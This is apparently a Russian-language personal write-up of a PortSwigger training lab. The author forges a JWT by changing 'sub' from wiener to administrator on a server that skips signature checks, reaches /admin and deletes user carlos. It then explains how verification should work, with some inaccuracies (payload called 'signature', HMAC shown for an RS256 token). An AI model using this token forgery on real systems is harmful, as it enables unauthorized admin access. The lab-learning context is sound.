# обход аутентификации JWT с помощью непроверенной подписи
лаба https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature

сервер не проверяет подпись почему-то...

задание: через /admin попасть в админку и удалить карлоса

----

залогинился 
вот моя страница отк по запросу

```http
GET /my-account?id=wiener HTTP/2
Host: 0afd002f03151fcf806a99e100b90098.web-security-academy.net
Cookie: session=eyJraWQiOiI5MGM5NmJhYS1kMzQ0LTRjNzMtYWIxYi04NWU5MWRiOWJhMTciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyNTYxNywic3ViIjoid2llbmVyIn0.VF0kkvjo1eaRzwf1YEbSamR_721qKbU-wpFUuCOeYBR-xxNDeVBaveo3mFQuT9aL7bMZVdJ1382lROwz6ozobUdZsLgpcVEgam-_7rUK-yNLj8Sz8WiKF_hVdxl5PC3XtWixRGfcVbIkyDXx_uKPmm-hrml0jRSG6ES9G_oiK46opEvLBNT2YgcK1NnFw9F_JBMRiPTmHXaBkBut4c3kebZBj0oX0NeqnqMLJ430kyiTfFhdAlWa2o9Td-qyLy8PPrdtlFfQ0e92me7Hvk3uaxXiGRJ8W-jEegVsSihesYvD6ifMKh2RVGSph-FUwEvmWVKljBozyJL58gR5KsCkTQ
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afd002f03151fcf806a99e100b90098.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```
json - отлично видно структуру
```json
session=eyJraWQiOiI5MGM5NmJhYS1kMzQ0LTRjNzMtYWIxYi04NWU5MWRiOWJhMTciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyNTYxNywic3ViIjoid2llbmVyIn0.VF0kkvjo1eaRzwf1YEbSamR_721qKbU-wpFUuCOeYBR-xxNDeVBaveo3mFQuT9aL7bMZVdJ1382lROwz6ozobUdZsLgpcVEgam-_7rUK-yNLj8Sz8WiKF_hVdxl5PC3XtWixRGfcVbIkyDXx_uKPmm-hrml0jRSG6ES9G_oiK46opEvLBNT2YgcK1NnFw9F_JBMRiPTmHXaBkBut4c3kebZBj0oX0NeqnqMLJ430kyiTfFhdAlWa2o9Td-qyLy8PPrdtlFfQ0e92me7Hvk3uaxXiGRJ8W-jEegVsSihesYvD6ifMKh2RVGSph-FUwEvmWVKljBozyJL58gR5KsCkTQ
```

раскодирую этот json

-------
eyJraWQiOiI5MGM5NmJhYS1kMzQ0LTRjNzMtYWIxYi04NWU5MWRiOWJhMTciLCJhbGciOiJSUzI1NiJ9
заголовок - служебная инфа о том, как подписан токен
```json
{"kid":"90c96baa-d344-4c73-ab1b-85e91db9ba17","alg":"RS256"}
```

**KID** (Key ID) — это строка-идентификатор, которая говорит серверу: "Эй, для проверки этого токена используй вот такой ключ из хранилища"

RS256 - ассиметричное шифрование (использует и пуличный и приват ключ)

------------

eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MjUyNTYxNywic3ViIjoid2llbmVyIn0
пейлоад = подпись
кто ты,  и когда токен протухнет exp
```json
{"iss":"portswigger","exp":1772525617,"sub":"wiener"}
```
используется здесь как пароль

сам токен  SIGNATURE (бинарные данные)
```json
VF0kkvjo1eaRzwf1YEbSamR_721qKbU-wpFUuCOeYBR-xxNDeVBaveo3mFQuT9aL7bMZVdJ1382lROwz6ozobUdZsLgpcVEgam-_7rUK-yNLj8Sz8WiKF_hVdxl5PC3XtWixRGfcVbIkyDXx_uKPmm-hrml0jRSG6ES9G_oiK46opEvLBNT2YgcK1NnFw9F_JBMRiPTmHXaBkBut4c3kebZBj0oX0NeqnqMLJ430kyiTfFhdAlWa2o9Td-qyLy8PPrdtlFfQ0e92me7Hvk3uaxXiGRJ8W-jEegVsSihesYvD6ifMKh2RVGSph-FUwEvmWVKljBozyJL58gR5KsCkTQ
```

--------

моя цель - 
```json

{"iss":"portswigger","exp":1772525617,"sub":"wiener"}
```

изменить на administrator
```json

{"iss":"portswigger","exp":1772525617,"sub":"administrator"}
```

и посмотреть что будет..

-----

еду в репитер со своим запросом

меняю запрос на GET /admin HTTP/2
и ответ Unauthorized 401

burp оч удобно сам деодит этот jwt 

<img src="../../assets/jwt01112026-03-0312.24.37.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



я подменил   wiener на  administrator

подставил полученный новый измененный json 

и вуаля - я в админке

<img src="../../assets/jwt01010122026-03-0312.26.43.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />



-------

ну а потом по пути - GET /admin/delete?username=carlos стер карлоса - лаба решена!

-------


## вывод

обычно безопасный JWT-механизм работает так:

сервер получает токен.

смотрит на заголовок (`alg`) и берёт нужный ключ (по `kid`)
   
**проверяет подпись**, чтобы убедиться, что токен не подделан и данные (например, `sub: wiener`) настоящие
   
если подпись верна — доверяет данным.
   
-------

в этой лабе шаг 3 просто **отсутствует**
сервер, скорее всего, использует метод, который только **декодирует** (`decode()`) base64, но не верифицирует (`verify()`) подпись .

Он берёт payload из токена и слепо верит, что раз токен пришёл от клиента, значит, он валидный

-----

Если бы сервер проверял подпись, он бы:

1. Взял твой измененный `header` и `payload`
2. Заново вычислил подпись своим секретным ключом
3. Сравнил с твоей старой подписью — они **НЕ совпали бы**    
4. Вернул бы 401 Unauthorized
   
**НО сервер этого не сделал.*


Сервер **не хранит** подпись отдельно. Когда он получает токен, он делает так:

```js
// 1. Разбирает токен на части
let [header, payload, signature] = token.split('.');

// 2. Берет СВОЙ секретный ключ (который есть только у сервера)
let secretKey = "супер-секретный-ключ-сервера";

// 3. ВЫЧИСЛЯЕТ подпись ЗАНОВО из header и payload
let expectedSignature = HMACSHA256(header + "." + payload, secretKey);

// 4. СРАВНИВАЕТ с тем, что пришло
if (expectedSignature === signature) {
    // Ок, токен настоящий
} else {
    // Подделка!
}
```

